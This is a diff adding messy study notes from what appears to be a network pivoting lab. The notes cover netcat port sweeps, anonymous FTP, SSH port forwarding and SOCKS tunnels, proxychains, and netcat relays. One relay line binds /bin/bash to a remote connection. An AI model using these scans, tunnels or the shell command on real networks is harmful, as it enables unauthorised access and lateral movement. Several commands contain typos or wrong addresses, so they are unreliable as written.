@@ -129,6 +129,39 @@ nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'
 nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
 nc -nuzvw1 172.16.82.110 1980-1989 2>&1 | grep -E 'succ|open'
 
+-------------------------------------------------------------------------
+##Example
+nc 10.50.30.212 25
+##Now look at the uders
+ssh -p 25 bob@10.50.30.212
+##As bob run your scans what programs installed
+    which nc
+    #do a horizaonal scan
+    for i in {100..110}; do nc -nvzw1 10.0.0.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
+    #101 21 22 80
+    #103 21 22 80
+    #102 22
+    #104 21 22 23 80
+    ftp 10.0.0.104 #this will log you in as anonymouse
+    pwd #get the directory
+    ls # now show the directory listing
+-------------------------------------------------------------------------
+# Its Tunnel Time
+ssh -p 25 bob@10.50.30.212 -D 9050 -NT
+# -p destination port
+# -D Source port
+proxychain ./scan.sh
+#this will create the proxy chain and send the scan through the ssh Tunnel
+#instead server establishing the client will do both
+proxychains ftp 10.0.0.104 #this will make the connection via proxy chains
+passive 
+GET hint.txt
+GET 
+    #set mode to passive
+proxychains curl ftp://10.0.0.104 #This will send the ftp command though the Tunnel
+wget -r http://172.16.82.106:8080
+ls 10.0.0.104/ #creates aa folder with the listing of the directory
+-------------------------------------------------------------------------
 #Horizontal Scan a range of IPs for specific TCP ports using Netcat:
 for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
     
@@ -172,6 +205,113 @@ for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo 
 #Using ping:
 #Ping scan a range of IPs:
 for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
+
+-------------------------------------------------------------------------
+# Secure Copy
+scp student@10.10.0.40:hint.txt . #.present ..parent
+#the boave will pull a file from comptur at its current directory
+scp student@10.10.0.40:/home/student/hint.txt /home/student/newfile.txt
+#this will place a file into the above directory
+
+## Moving into the private network
+    ssh student@172.16.82.106
+    ssh 192.168.1.10
+    scp -3 student@10.10.0.40:student_net_range_blue_only.png student@192.168.1.10:
+    #scp -3 "source" student@10.10.0.40:student_net_range_blue_only.png"Spurce" student@192.168.1.10"desitnation"
+    #local to remote
+    #remote to local
+    #local to local
+#what if SSH isn't running on common port, LETS CHANGE IT YEAHHHHHHHHHHHHHHHHHHHHHHHHHH
+    cd /etc/sshd
+    #this wil edit the daemon file
+    ssh_config # config file for all ssh parameters. modify this file to allow different listening ports etc
+    sudo nano sshd_config
+    sudo systemctl restart ssh
+    nestat -antlp
+    scp -P 29 flag.png student@172.16.82.106:
+    -------------------------------------------------------------------------
+    ssh student@172.16.82.106 -p 29 -L 1111:192.168.1.10:22:
+    ssh "blue host" -p "blue host ssh port" -L "Blue priv host""Blue priv port"
+    ssh student@172.16.82.106
+     -p 29 #outbound port on the Blue Host
+     -L 1111: #listening port on the internet host
+     192.168.1.10: #the pricate ip
+     22 #blue priv host ssh tunnel
+
+     ssh student@127.0.0.1 -p 1111
+     scp -P 1111 flag.png student@localhost: #this will send the file out the 1111 port to the priv computer 
+
+     #now dynamic hosts, write in perspective of blue host 
+     ssh student@172.16.82.106 -D 9050 -NT 
+     proxychains scp flag.png student@192.168.1.10:
+     #-P would be designatred port on the priv box
+     ps -elf | grep 
+     kill -9 "pid"
+
+
+     #now using netcat for tunnels
+     nc -lvp 1234 < flag.png
+
+     nc 10.10.0.40 1234 > flag.png
+
+     Internet client
+     nc 172.16.82.106 1234
+     ---------------------------------
+     #2
+
+
+
+     relay
+     mkfifo fifopipe
+     mknod nodpipe p
+     10.
+     nc -lvp 1234 <fifopipe | nc -lvp 4321 > fifopipe 
+    ---------------------------------
+     #2
+
+
+     priv client
+     nc 192.168.1.1 4321
+     nc 172.16.82.106 1234 < flag.png
+    ---------------------------------
+     #2
+     nc 192.168.1.1 4321 -e /bin/bash
+```
+More tunneling
+
+ssh     -P<optional>  <user account>@<pivot ip>  -L <iptional local bind>:<local port>:<
+        -p 22           student@172.16.82.115    -L 1111:localhost:22
+        -p 1111         localhost
+
+ssh -p22 student@176.16.82.106 -L 1111:localhost:22
+ssh -p 1111 student@localhost
+# this will pull the web page for the .106
+ssh -p22 student@176.16.82.106 -L 1111:localhost:80
+wget -r http://localhost:1111
+
+# this will pull the webpage for the .10
+ssh -p22 student@176.16.82.106 -L 1111:192.168.1.10:80
+wget -r http://localhost:1111
+
+# this will pull the webpage for the .10
+ssh -p22 student@176.16.82.106 -L 1111:localhost:23
+telnet localhost 1111
+
+# now we are not on the internet host
+# take you 106 telnet
+ssh -p22 student@10.10.0.40 -R 1111:localhost:23
+telnet localhost 1111 
+
+# take you 106 telnet
+ssh -p1111 student@localhost
+wget -r http://localhost:1111
+ssh -p22 student@10.10.0.40 -R 1111:192.168.1.10:22
+telnet localhost 1111 
+
+
+
+
+
 
 
 
